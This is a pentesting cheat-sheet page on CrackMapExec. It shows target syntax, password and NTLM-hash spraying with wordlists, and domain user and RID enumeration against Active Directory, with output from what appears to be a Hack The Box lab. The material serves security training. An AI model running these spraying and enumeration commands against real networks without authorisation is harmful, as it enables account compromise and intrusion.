---
title: Crackmapexec (CME)
source_url: https://notes.incendium.rocks/pentesting-notes/windows-pentesting/tools/crackmapexec-cme
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: windows
---

CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of *large* Active Directory networks. Built with stealth in mind, CME follows the concept of "Living off the Land": abusing built-in Active Directory features/protocols to achieve it's functionality and allowing it to evade most endpoint protection/IDS/IPS solutions.

***

## Usage

Running `cme --help` will list general options and protocols that are available (Notice the 'protocols' section below):

```bash
#~ crackmapexec --help
usage: cme [-h] [-v] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL]
           [--darrell] [--verbose]
           {http,smb,mssql} ...

      ______ .______           ___        ______  __  ___ .___  ___.      ___      .______    _______ ___   ___  _______   ______
     /      ||   _  \         /   \      /      ||  |/  / |   \/   |     /   \     |   _  \  |   ____|\  \ /  / |   ____| /      |
    |  ,----'|  |_)  |       /  ^  \    |  ,----'|  '  /  |  \  /  |    /  ^  \    |  |_)  | |  |__    \  V  /  |  |__   |  ,----'
    |  |     |      /       /  /_\  \   |  |     |    <   |  |\/|  |   /  /_\  \   |   ___/  |   __|    >   <   |   __|  |  |
    |  `----.|  |\  \----. /  _____  \  |  `----.|  .  \  |  |  |  |  /  _____  \  |  |      |  |____  /  .  \  |  |____ |  `----.
     \______|| _| `._____|/__/     \__\  \______||__|\__\ |__|  |__| /__/     \__\ | _|      |_______|/__/ \__\ |_______| \______|

                                         A swiss army knife for pentesting networks
                                    Forged by @byt3bl33d3r using the powah of dank memes

                                                      Version: 4.0.0dev
                                                     Codename: 'Sercurty'

optional arguments:
  -h, --help         show this help message and exit
  -v, --version      show program's version number and exit
  -t THREADS         set how many concurrent threads to use (default: 100)
  --timeout TIMEOUT  max timeout in seconds of each thread (default: None)
  --jitter INTERVAL  sets a random delay between each connection (default: None)
  --darrell          give Darrell a hand
  --verbose          enable verbose output

protocols:
  available protocols

  {http,smb,mssql}
    http             own stuff using HTTP(S)
    smb              own stuff using SMB and/or Active Directory
    mssql            own stuff using MSSQL and/or Active Directory

```

## Target Formats

Every protocol supports targets by CIDR notation(s), IP address(s), IP range(s), hostname(s), a file containing a list of targets or combination of all of the latter:

```powershell
crackmapexec <protocol> ms.evilcorp.org
```

```powershell
crackmapexec <protocol> 192.168.1.0 192.168.0.2
```

```powershell
	crackmapexec <protocol> 192.168.1.0/24
```

```powershell
crackmapexec <protocol> 192.168.1.0-28 10.0.0.1-67
```

```powershell
crackmapexec <protocol> ~/targets.txt
```

## Using Credentials

Every protocol supports using credentials in one form or another. For details on using credentials with a specific protocol, see the appropriate wiki section. Generally speaking, to use credentials, you can run the following commands:

```powershell
crackmapexec <protocol> <target(s)> -u username -p password
```

ℹ️ When using usernames or passwords that contain special symbols, wrap them in single quotes to make your shell interpret them as a string.

Example:

```powershell
crackmapexec <protocol> <target(s)> -u username -p 'Admin!123@'
```

### Brute force login with wordlists

```bash
crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -p ~/file_containing_passwords
```

ℹ️ By default CME will exit after a successful login is found. Using the --continue-on-success flag will continue spraying even after a valid password is found. Usefull for spraying a single password against a large user list.

Example:

```bash
crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes --no-bruteforce --continue-on-success
```

## Enumerating with crackmapexec

Here are some common commands to use when enumerating with crackmapexec

### Find users

```bash
┌──(kali㉿kali)-[~/htb/zephyr/192.168.210.10]
└─$ crackmapexec smb 192.168.210.10 -u users.txt -p passwords.txt
SMB         192.168.210.10  445    ZPH-SVRDC01      [*] Windows 10.0 Build 20348 x64 (name:ZPH-SVRDC01) (domain:zsm.local) (signing:True) (SMBv1:False)
SMB         192.168.210.10  445    ZPH-SVRDC01      [-] zsm.local\marcus:Mail4Painter2022!@# STATUS_LOGON_FAILURE
SMB         192.168.210.10  445    ZPH-SVRDC01      [-] zsm.local\marcus:P@ssw0rd STATUS_LOGON_FAILURE
SMB         192.168.210.10  445    ZPH-SVRDC01      [-] zsm.local\marcus:!QAZ1qaz STATUS_LOGON_FAILURE
SMB         192.168.210.10  445    ZPH-SVRDC01      [+] zsm.local\marcus:!QAZ2wsx
```

**With credentials we can get all users in the domain:**

```
crackmapexec smb zsm.local -u marcus -p password123 --users
SMB         zsm.local       445    ZPH-SVRDC01      [*] Windows 10.0 Build 20348 x64 (name:ZPH-SVRDC01) (domain:zsm.local) (signing:True) (SMBv1:False)
SMB         zsm.local       445    ZPH-SVRDC01      [+] zsm.local\jamie:P@ssw0rd
SMB         zsm.local       445    ZPH-SVRDC01      [+] Enumerated domain user(s)
SMB         zsm.local       445    ZPH-SVRDC01      zsm.local\jamie                          badpwdcount: 0 desc:
SMB         zsm.local       445    ZPH-SVRDC01      zsm.local\ca_svc                         badpwdcount: 0 desc:
SMB         zsm.local       445    ZPH-SVRDC01      zsm.local\marcus                         badpwdcount: 6 desc:
SMB         zsm.local       445    ZPH-SVRDC01      zsm.local\paul.williams                  badpwdcount: 0 desc:
SMB         zsm.local       445    ZPH-SVRDC01      zsm.local\daniel.morris                  badpwdcount: 0 desc:
SMB         zsm.local       445    ZPH-SVRDC01      zsm.local\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account
SMB         zsm.local       445    ZPH-SVRDC01      zsm.local\Guest                          badpwdcount: 0 desc: Built-in account for guest access to the computer/domain
SMB         zsm.local       445    ZPH-SVRDC01      zsm.local\Administrator                  badpwdcount: 3 desc: Built-in account for administering the computer/domain
```

**Use --rid-brute to brute all principals in the domain:**

```bash
crackmapexec smb zsm.local -u <user> -p <password> --rid-brute 10000
```
